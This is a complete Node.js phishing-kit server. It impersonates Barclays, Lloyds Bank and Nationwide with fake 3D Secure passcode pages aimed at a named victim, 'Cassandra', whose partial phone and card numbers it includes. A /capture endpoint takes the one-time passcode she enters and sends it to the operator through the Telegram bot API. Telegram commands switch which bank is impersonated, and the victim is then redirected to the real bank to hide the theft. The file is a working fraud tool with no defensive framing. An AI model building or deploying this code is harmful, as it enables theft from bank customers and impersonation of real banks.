const express = require('express');
const app = express();
const https = require('https');
const fs = require('fs');

// ==========================================
// CONFIGURATION
// ==========================================

const TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';

// Multi-bank configuration
const BANKS = {
  barclays: {
    name: 'Barclays',
    color: '#00395d',
    secondaryColor: '#0076a8',
    logo: 'barclays',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif',
    showCardImage: false,
    showReference: false,
    buttonStyle: 'rounded',
    confirmText: 'Confirm',
    cancelText: 'Cancel payment',
    headerText: 'Confirm with a passcode',
    descriptionTemplate: 'We\'ve sent a 6-digit passcode to {phone}. Never share it.',
    footerText: 'SSL Encrypted • Verified by Visa',
    css: `
      .logo { color: #00aeef; font-weight: 700; font-size: 26px; }
      .container { border-top: 4px solid #00395d; }
      .confirm-btn { background: #0076a8; border-radius: 30px; }
      .confirm-btn:hover { background: #00395d; }
      .alert { background: #fff3cd; border-left: 4px solid #ffc107; }
    `
  },
  
  lloyds: {
    name: 'Lloyds Bank',
    color: '#006A4D',
    secondaryColor: '#00A1A1',
    logo: 'lloyds',
    fontFamily: '"Lloyds Bank", -apple-system, BlinkMacSystemFont, sans-serif',
    showCardImage: true,
    showReference: true,
    referencePrefix: 'REF',
    buttonStyle: 'squared',
    confirmText: 'Continue',
    cancelText: 'Not your card?',
    headerText: 'Verify your identity',
    descriptionTemplate: 'We may send you a One Time Passcode to {phone} to make sure it\'s you.',
    footerText: 'Secure • Verified by Visa',
    css: `
      .logo { color: #006A4D; font-weight: 600; font-size: 24px; }
      .logo::before { content: "🐴 "; }
      .container { border-top: 4px solid #006A4D; }
      .confirm-btn { background: #006A4D; border-radius: 4px; text-transform: uppercase; font-weight: 600; }
      .confirm-btn:hover { background: #004d3a; }
      .alert { background: #e8f5f0; border-left: 4px solid #006A4D; }
      .reference-box { background: #f5f5f5; padding: 10px; margin: 15px 0; border-radius: 4px; font-size: 14px; }
      .card-image { width: 60px; height: 40px; background: linear-gradient(135deg, #006A4D 0%, #00A1A1 100%); border-radius: 8px; margin-bottom: 15px; }
    `
  },
  
  nationwide: {
    name: 'Nationwide',
    color: '#003366',
    secondaryColor: '#0095D9',
    logo: 'nationwide',
    fontFamily: '"Nationwide", -apple-system, BlinkMacSystemFont, sans-serif',
    showCardImage: false,
    showReference: false,
    buttonStyle: 'rounded',
    confirmText: 'Confirm payment',
    cancelText: 'Cancel payment',
    headerText: 'Confirm your payment',
    descriptionTemplate: 'We\'ll send a one-time passcode to your mobile ending in {phone} to verify it\'s you.',
    footerText: 'Protected by Nationwide • Verified by Visa',
    css: `
      .logo { color: #003366; font-weight: 700; font-size: 24px; }
      .logo::before { content: "🏠 "; }
      .container { border-top: 4px solid #003366; }
      .confirm-btn { background: #0095D9; border-radius: 25px; font-weight: 600; }
      .confirm-btn:hover { background: #003366; }
      .alert { background: #e6f2ff; border-left: 4px solid #003366; }
      .help-link { color: #0095D9; font-size: 14px; text-decoration: underline; }
    `
  }
};

// Current bank (default)
let currentBank = 'barclays';

// Target data
const TARGETS = {
  cass: { name: 'Cassandra', phoneLast: '895', cardLast: '6219', amount: '£892.50', merchant: 'Argos' },
};

// ==========================================
// TELEGRAM BOT COMMANDS
// ==========================================

function sendTelegram(message) {
  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  };
  https.get(`${url}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`);
}

// Check Telegram commands
let lastUpdateId = 0;
setInterval(() => {
  const url = `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
  https.get(url, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const updates = JSON.parse(data);
        if (updates.result) {
          updates.result.forEach(update => {
            lastUpdateId = update.update_id;
            if (update.message?.text) {
              const text = update.message.text.toLowerCase();
              const chatId = update.message.chat.id;
              
              if (chatId.toString() !== CHAT_ID) return;
              
              let response = '';
              
              // Bank switching commands
              if (text === '/setbank barclays' || text === '/bank barclays') {
                currentBank = 'barclays';
                response = '✅ Bank switched to: <b>Barclays</b>\n\nURL: https://your-domain.com/?bank=barclays&id=cass';
              }
              else if (text === '/setbank lloyds' || text === '/bank lloyds') {
                currentBank = 'lloyds';
                response = '✅ Bank switched to: <b>Lloyds Bank</b>\n\n🐴 Green theme, horse logo, reference numbers\n\nURL: https://your-domain.com/?bank=lloyds&id=cass';
              }
              else if (text === '/setbank nationwide' || text === '/bank nationwide') {
                currentBank = 'nationwide';
                response = '✅ Bank switched to: <b>Nationwide</b>\n\n🏠 Blue theme, house logo, building society style\n\nURL: https://your-domain.com/?bank=nationwide&id=cass';
              }
              else if (text === '/banks' || text === '/list') {
                response = '🏦 <b>Available Banks:</b>\n\n• /bank barclays - Blue theme\n• /bank lloyds - Green theme (Lloyds Bank)\n• /bank nationwide - Blue theme (Nationwide)\n\nCurrent: ' + BANKS[currentBank].name;
              }
              else if (text === '/status') {
                const bank = BANKS[currentBank];
                response = `📊 <b>Current Status:</b>\n\nBank: ${bank.name}\nTheme: ${bank.color}\nTarget: Cassandra\nPhone: ***${TARGETS.cass.phoneLast}\nAmount: ${TARGETS.cass.amount}`;
              }
              
              if (response) sendTelegram(response);
            }
          });
        }
      } catch (e) {}
    });
  });
}, 5000);

// ==========================================
// MULTI-BANK HTML GENERATOR
// ==========================================

function generatePage(bankKey, targetId) {
  const bank = BANKS[bankKey] || BANKS.barclays;
  const target = TARGETS[targetId] || TARGETS.cass;
  
  const reference = bank.showReference ? 
    `<div class="reference-box">Reference: ${bank.referencePrefix}-${Math.random().toString(36).substr(2, 9).toUpperCase()}</div>` : '';
  
  const cardImage = bank.showCardImage ? 
    `<div class="card-image"></div>` : '';
  
  const phoneMasked = '********' + target.phoneLast;
  const description = bank.descriptionTemplate.replace('{phone}', phoneMasked);
  
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${bank.name} - 3D Secure</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: ${bank.fontFamily};
            background: #f4f4f4;
            padding: 15px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 480px;
            margin: 0 auto;
            background: white;
            min-height: calc(100vh - 30px);
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: relative;
            overflow: hidden;
        }
        
        ${bank.css}
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .content {
            padding: 30px 20px 100px;
        }
        
        h1 {
            font-size: 26px;
            color: ${bank.color};
            margin-bottom: 20px;
            font-weight: 600;
            line-height: 1.2;
        }
        
        .description {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        
        .phone-number {
            font-weight: 700;
            color: ${bank.secondaryColor};
        }
        
        .transaction-box {
            background: #f9f9f9;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            border-left: 4px solid ${bank.color};
        }
        
        .merchant-name {
            font-size: 20px;
            font-weight: 700;
            color: #333;
            margin-bottom: 8px;
        }
        
        .amount {
            font-size: 36px;
            font-weight: 800;
            color: ${bank.color};
            margin-bottom: 5px;
            letter-spacing: -1px;
        }
        
        .date {
            color: #888;
            font-size: 15px;
        }
        
        .input-section {
            margin-bottom: 25px;
        }
        
        .input-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .input-label {
            font-weight: 700;
            color: #333;
            font-size: 17px;
        }
        
        .resend-link {
            color: ${bank.secondaryColor};
            font-size: 14px;
            text-decoration: none;
            font-weight: 600;
        }
        
        .code-input {
            width: 100%;
            padding: 20px;
            border: 3px solid ${bank.color};
            border-radius: 10px;
            font-size: 32px;
            text-align: center;
            letter-spacing: 15px;
            font-weight: 700;
            color: #333;
            background: #fff;
            transition: all 0.3s;
        }
        
        .code-input:focus {
            outline: none;
            border-color: ${bank.secondaryColor};
            box-shadow: 0 0 0 4px ${bank.color}20;
        }
        
        .timer {
            text-align: center;
            color: #d32f2f;
            font-size: 15px;
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .confirm-btn {
            width: 100%;
            padding: 20px;
            color: white;
            border: none;
            font-size: 19px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .cancel-link {
            display: block;
            text-align: center;
            color: #d32f2f;
            font-size: 17px;
            text-decoration: underline;
            font-weight: 600;
            padding: 10px;
        }
        
        .help-link {
            display: block;
            text-align: center;
            color: ${bank.secondaryColor};
            font-size: 14px;
            margin-top: 10px;
            text-decoration: underline;
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 480px;
            background: #f9f9f9;
            padding: 20px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
            font-size: 13px;
            color: #666;
        }
        
        @media (max-width: 480px) {
            .container { max-width: 100%; border-radius: 0; }
            .content { padding: 25px 15px 80px; }
            h1 { font-size: 24px; }
            .amount { font-size: 28px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">${bank.name}</div>
            <svg width="50" height="20" viewBox="0 0 50 20">
                <rect fill="#1a1f71" width="50" height="20" rx="2"/>
                <text x="5" y="14" fill="white" font-size="10" font-weight="bold">VISA</text>
            </svg>
        </div>
        
        <div class="content">
            <h1>${bank.headerText}</h1>
            
            <p class="description">${description}</p>
            
            ${cardImage}
            ${reference}
            
            <div class="transaction-box">
                <div class="merchant-name">${target.merchant}</div>
                <div class="amount">${target.amount}</div>
                <div class="date">${new Date().toLocaleDateString('en-GB', {day: 'numeric', month: 'long', year: 'numeric'})}</div>
            </div>
            
            <div class="input-section">
                <div class="input-header">
                    <label class="input-label">Enter passcode</label>
                    <a href="#" class="resend-link" onclick="return false;">Resend code</a>
                </div>
                
                <div class="timer" id="timer">Code expires in: 02:59</div>
                
                <input type="tel" class="code-input" id="otp" maxlength="6" placeholder="------" inputmode="numeric">
            </div>
            
            <button class="confirm-btn" onclick="submit()">${bank.confirmText}</button>
            
            <a href="#" class="cancel-link" onclick="return false;">${bank.cancelText}</a>
            <a href="#" class="help-link" onclick="return false;">Having problems?</a>
        </div>
        
        <div class="footer">
            ${bank.footerText}
        </div>
    </div>

    <script>
        let timeLeft = 179;
        setInterval(() => {
            timeLeft--;
            let m = Math.floor(timeLeft/60), s = timeLeft%60;
            document.getElementById('timer').textContent = 
                'Code expires in: ' + (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
        }, 1000);
        
        function submit() {
            const otp = document.getElementById('otp').value;
            fetch('/capture?bank=${bankKey}&id=${targetId}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({otp: otp})
            });
            document.querySelector('.confirm-btn').textContent = 'Verifying...';
            setTimeout(() => location.href = 'https://www.${bank.name.toLowerCase().replace(/\s/g,'')}.co.uk/', 2000);
        }
    </script>
</body>
</html>`;
}

// ==========================================
// ROUTES
// ==========================================

app.use(express.json());

// Main page with bank switch
app.get('/', (req, res) => {
  const bank = req.query.bank || currentBank;
  const target = req.query.id || 'cass';
  res.send(generatePage(bank, target));
});

// Capture endpoint
app.post('/capture', (req, res) => {
  const otp = req.body.otp;
  const bank = req.query.bank || currentBank;
  const targetId = req.query.id || 'cass';
  const target = TARGETS[targetId];
  const bankName = BANKS[bank]?.name || 'Unknown';
  
  const message = `🚨 <b>${bankName.toUpperCase()} OTP CAPTURED</b> 🚨

🏦 Bank: ${bankName}
👤 Target: ${target?.name || 'Unknown'}
📱 Phone: ***${target?.phoneLast || '***'}
💳 Card: ****${target?.cardLast || '****'}
💰 Amount: ${target?.amount || 'Unknown'}
🔢 OTP: <code>${otp}</code>
⏰ Time: ${new Date().toLocaleString()}`;
  
  sendTelegram(message);
  res.json({success: true});
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    currentBank: BANKS[currentBank].name,
    availableBanks: Object.keys(BANKS)
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Multi-Bank 3DS Server running on port ${PORT}`);
  console.log(`Current bank: ${BANKS[currentBank].name}`);
  console.log('Telegram bot active');
  console.log('Commands: /bank barclays, /bank lloyds, /bank nationwide');
});
